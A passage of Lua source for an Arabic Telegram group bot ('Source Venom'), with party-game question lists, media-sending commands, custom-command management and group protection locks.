"لو خيروك |  بين اللعب مع الأطفال لمدة 7 ساعات أو الجلوس دون فعل أي شيء لمدة 24 ساعة؟ ",
"لو خيروك |  بين شرب كوب من الحليب أو شرب كوب من شراب عرق السوس؟ ",
"لو خيروك |  بين الشخص الذي تحبه وصديق الطفولة؟ ",
"لو خيروك |  بين أمك وأبيك؟ ",
"لو خيروك |  بين أختك وأخيك؟ ",
"لو خيروك |  بين نفسك وأمك؟ ",
"لو خيروك |  بين صديق قام بغدرك وعدوك؟ ",
"لو خيروك |  بين خسارة حبيبك/حبيبتك أو خسارة أخيك/أختك؟ ",
"لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ ",
"لو خيروك |  بين ابنك وابنتك؟ ",
"لو خيروك |  بين زوجتك وابنك/ابنتك؟ ",
"لو خيروك |  بين جدك أو جدتك؟ ",
"لو خيروك |  بين زميل ناجح وحده أو زميل يعمل كفريق؟ ",
"لو خيروك |  بين لاعب كرة قدم مشهور أو موسيقي مفضل بالنسبة لك؟ ",
"لو خيروك |  بين مصور فوتوغرافي جيد وبين مصور سيء ولكنه عبقري فوتوشوب؟ ",
"لو خيروك |  بين سائق سيارة يقودها ببطء وبين سائق يقودها بسرعة كبيرة؟ ",
"لو خيروك |  بين أستاذ اللغة العربية أو أستاذ الرياضيات؟ ",
"لو خيروك |  بين أخيك البعيد أو جارك القريب؟ ",
"لو خيروك |  يبن صديقك البعيد وبين زميلك القريب؟ ",
"لو خيروك |  بين رجل أعمال أو أمير؟ ",
"لو خيروك |  بين نجار أو حداد؟ ",
"لو خيروك |  بين طباخ أو خياط؟ ",
"لو خيروك |  بين أن تكون كل ملابس بمقاس واحد كبير الحجم أو أن تكون جميعها باللون الأصفر؟ ",
"لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ ",
"لو خيروك |  بين أن تمتلك زر إيقاف موقت للوقت أو أن تمتلك أزرار للعودة والذهاب عبر الوقت؟ ",
"لو خيروك |  بين أن تعيش بدون موسيقى أبدًا أو أن تعيش بدون تلفاز أبدًا؟ ",
"لو خيروك |  بين أن تعرف متى سوف تموت أو أن تعرف كيف سوف تموت؟ ",
"لو خيروك |  بين العمل الذي تحلم به أو بين إيجاد شريك حياتك وحبك الحقيقي؟ ",
"لو خيروك |  بين معاركة دب أو بين مصارعة تمساح؟ ",
"لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ ",
"لو خيروك |  بين امتلاك قدرة التحدث بكل لغات العالم أو التحدث إلى الحيوانات؟ ",
"لو خيروك |  بين أن تفوز في اليانصيب وبين أن تعيش مرة ثانية؟ ",
"لو خيروك |  بأن لا يحضر أحد إما لحفل زفافك أو إلى جنازتك؟ ",
"لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ ",
"لو خيروك |  بين العمل لأيام أقل في الأسبوع مع زيادة ساعات العمل أو العمل لساعات أقل في اليوم مع أيام أكثر؟ ",
"لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ ",
"لو خيروك |  بين التحدث عن كل شيء يدور في عقلك وبين عدم التحدث إطلاقًا؟ ",
"لو خيروك |  بين مشاهدة فيلم بمفردك أو الذهاب إلى مطعم وتناول العشاء بمفردك؟ ",
"لو خيروك |  بين قراءة رواية مميزة فقط أو مشاهدتها بشكل فيلم بدون القدرة على قراءتها؟ ",
"لو خيروك |  بين أن تكون الشخص الأكثر شعبية في العمل أو المدرسة وبين أن تكون الشخص الأكثر ذكاءً؟ ",
"لو خيروك |  بين إجراء المكالمات الهاتفية فقط أو إرسال الرسائل النصية فقط؟ ",
"لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ ",
"لو خيروك |  بين تغيير لون عينيك أو لون شعرك؟ ",
"لو خيروك |  بين امتلاك كل عين لون وبين امتلاك نمش على خديك؟ ",
"لو خيروك |  بين الخروج بالمكياج بشكل مستمر وبين الحصول على بشرة صحية ولكن لا يمكن لك تطبيق أي نوع من المكياج؟ ",
"لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ ",
"لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ ",
"لو خيروك |  بين موت شخصية بطل الدراما التي تتابعينها أو أن يبقى ولكن يكون العمل الدرامي سيء جدًا؟ ",
"لو خيروك |  بين العيش في دراما قد سبق وشاهدتها ماذا تختارين بين الكوميديا والتاريخي؟ ",
"لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ ",
"لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ ",
"لو خيروك |  بين البكاء والحزن وبين اكتساب الوزن؟ ",
"لو خيروك |  بين تنظيف الأطباق كل يوم وبين تحضير الطعام؟ ",
"لو خيروك |  بين أن تتعطل سيارتك في نصف الطريق أو ألا تتمكنين من ركنها بطريقة صحيحة؟ ",
"لو خيروك |  بين إعادة كل الحقائب التي تملكينها أو إعادة الأحذية الجميلة الخاصة بك؟ ",
"لو خيروك |  بين قتل حشرة أو متابعة فيلم رعب؟ ",
"لو خيروك |  بين امتلاك قطة أو كلب؟ ",
"لو خيروك |  بين الصداقة والحب ",
"لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ ",
"لو خيروك |  بين مشاركة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة؟ ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "حروف" or text == "حرف" or text == "الحروف" then 
local TWEET_Msg = { 
" جماد بحرف ↚ ر  ", 
" مدينة بحرف ↚ ع  ",
" حيوان ونبات بحرف ↚ خ  ", 
" اسم بحرف ↚ ح  ", 
" اسم ونبات بحرف ↚ م  ", 
" دولة عربية بحرف ↚ ق  ", 
" جماد بحرف ↚ ي  ", 
" نبات بحرف ↚ ج  ", 
" اسم بنت بحرف ↚ ع  ", 
" اسم ولد بحرف ↚ ع  ", 
" اسم بنت وولد بحرف ↚ ث  ", 
" جماد بحرف ↚ ج  ",
" حيوان بحرف ↚ ص  ",
" دولة بحرف ↚ س  ",
" نبات بحرف ↚ ج  ",
" مدينة بحرف ↚ ب  ",
" نبات بحرف ↚ ر  ",
" اسم بحرف ↚ ك  ",
" حيوان بحرف ↚ ظ  ",
" جماد بحرف ↚ ذ  ",
" مدينة بحرف ↚ و  ",
" اسم بحرف ↚ م  ",
" اسم بنت بحرف ↚ خ  ",
" اسم و نبات بحرف ↚ ر  ",
" نبات بحرف ↚ و  ",
" حيوان بحرف ↚ س  ",
" مدينة بحرف ↚ ك  ",
" اسم بنت بحرف ↚ ص  ",
" اسم ولد بحرف ↚ ق  ",
" نبات بحرف ↚ ز  ",
"  جماد بحرف ↚ ز  ",
"  مدينة بحرف ↚ ط  ",
"  جماد بحرف ↚ ن  ",
"  مدينة بحرف ↚ ف  ",
"  حيوان بحرف ↚ ض  ",
"  اسم بحرف ↚ ك  ",
"  نبات و حيوان و مدينة بحرف ↚ س  ", 
"  اسم بنت بحرف ↚ ج  ", 
"  مدينة بحرف ↚ ت  ", 
"  جماد بحرف ↚ ه  ", 
"  اسم بنت بحرف ↚ ر  ", 
" اسم ولد بحرف ↚ خ  ", 
" جماد بحرف ↚ ع  ",
" حيوان بحرف ↚ ح  ",
" نبات بحرف ↚ ف  ",
" اسم بنت بحرف ↚ غ  ",
" اسم ولد بحرف ↚ و  ",
" نبات بحرف ↚ ل  ",
"مدينة بحرف ↚ ع  ",
"دولة واسم بحرف ↚ ب  ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "ثيم" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,57); 
local Text ='اكتب ثيم وسيتم اختيار ثيم اخار' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/senddocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/agklpoj/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text and text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text and text:match("^كشف (.*)$") then 
local userid = text:match("^كشف (.*)$") 
function start_function(extra, result, success) 
if userid then 
tdcli_function ({ID = "GetUser",user_id_ = userid},function(extra,data)  
local rtp = Rutba(userid,msg.chat_id_) 
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = userid 
send(msg.chat_id_, msg.id_,'  𖥔الايدي ↚ 「'..iduser..'」\n 𖥔المعرف ↚ 「'..username..'」\n 𖥔الرتبه ↚ 「'..rtp..'」\n 𖥔نوع الكشف ↚ بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  𖥔المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == 'قناة السورس' then
local Text = [[ 
[قناه سورس الديبادخل وتابع الجديد](t.me/SOURCEVENOM)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺' then
local Text = [[ 
 𖥔من أحسن السورسات على التليجرام سورس الديب𖥔
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
خش على تواصل هيدخلك لروم التواصل 
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'التواصل'  then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL](t.me/TEAMVENOM1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹ᴛᴀᴡᴏsʟ˼', url="t.me/TEAMVENOM1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/34&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب فينوم' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 𖥔 اهلا في قائمه الالعاب المتطوره سورس الديب𖥔 
تفضل اختر لعبه من القائمه 
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

--------------------------------------------------------------------------------------------------------------
if text =='تغيير المطور الاساسي' and SUDOsv(msg) then
local Text = "سوف يتم تغير المطور الاساسي\nهل  انت  متأكد من هذا التغير ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'نعم', callback_data="yesS"..msg.sender_user_id_},{text = 'كلا , الغاء', callback_data="noS"..msg.sender_user_id_}},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end

if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع النسخه' and Devban(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end

if text == 'جلب النسخه' and Devban(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
GetFile_Bot(msg)
end
if text == 'الاوامر المضافه' and Constructor(msg) then
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
t = " 𖥔 قائمه الاوامر المضافه  \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
print(Cmds)
if Cmds then 
t = t..""..k..">> 「 '..v..' 」  ↚ {"..Cmds.."}\n"
else
t = t..""..k..">> 「 '..v..' 」 \n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد اوامر مضافه"
end
send(msg.chat_id_, msg.id_,'['..t..']')
end
if text == 'مسح الاوامر المضافه' or text == 'مسح الاوامر المضافه' then
if Constructor(msg) then 
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
database:del(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,' 𖥔 تم ازالة جميع الاوامر المضافه')  
end
end
if text == 'اضف امر' and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n ??| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الامر القديم')  
return false
end
if text == 'مسح امر' or text == 'مسح امر' then 
if Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الامر الجديد')  
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_,'true1') 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_) == 'true1' then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' 𖥔 تم حفظ الامر')  
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if text == "المطور" or text == "مطور" then
local TEXT_SUD = database:get(bot_id..'TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '〈 المطور 〉 -  \n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
{
{text = '𖥔 اضفني الي مجموعتك 𖥔 ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = SUDO, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
if text == "غنيلي" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(3,43); 
local Text ='تم اختيار المقطع الصوتي لك' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/dfgi9/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
end
if text == "تويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='مرحبا إليك تويت بالصوره✨🌚' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/wffhvv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "لو خيروك بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,24); 
local Text ='مرحبا اليك لو خيروك بالصوره🍁🌝' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/kbbnv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "حروف بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,15); 
local Text ='مرحبا إليك حروف بالصوره✨🌚' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ffadi8/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "مستقبلي" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,14); 
local Text ='حظك زي شكلك..😂💛' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/dyiotu/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "تفعيل تنظيف التلقائي" and BasicConstructor(msg)  then
database:set(bot_id.."LoMsg"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_, '𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n𖥔 تم تفعيل التنظيف التلقائي* ')
return false
end
if text == "تعطيل تنظيف التلقائي" and BasicConstructor(msg) then
database:del(bot_id.."LoMsg"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n𖥔 تم تعطيل التنظيف التلقائي* ')
return false
end

if text == 'تفعيل الحمايه'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل جلب الصوره ،\n 𖥔 تم قفل البوتات  ،\n 𖥔 تم قفل التكرار ،\n 𖥔 تم قفل الروابط ،\n 𖥔 تم قفل التوجيه ،\n 𖥔 تم قفل الملصقات ،\n 𖥔 تم قفل المتحركه ،\n 𖥔 تم قفل الفيديو ،\n 𖥔 تم قفل الفشار ،\n 𖥔 تم قفل الانلاين ،\n 𖥔 تم قفل تعديل المديا ،\n 𖥔 تم وضع التكرار  ،\n 𖥔 تم قفل الفارسيه  ،\n 𖥔 تم وضع الايدي بدون صوره ،n  \n 𖥔 تم تفعيل الحمايه  بواسطه ، [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
if text == 'تعطيل الحمايه'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
